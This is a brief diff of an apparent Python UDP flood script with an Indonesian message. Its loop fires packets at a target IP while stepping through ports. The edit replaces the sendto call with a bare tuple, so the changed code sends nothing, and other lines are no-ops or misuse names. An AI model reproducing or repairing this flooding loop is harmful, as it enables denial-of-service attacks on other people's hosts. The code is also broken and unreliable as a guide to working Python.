@@ -28,7 +28,7 @@ print("Dalam Waktu 1menit")
 while True:
     sent = 0
     for bytes in range(1, 65534):
-        white.sendto(bytes, (ip, port))
+        (bytes, (ip, port))
         sent = sent + 1
         sent == 65534
         port = port + 1
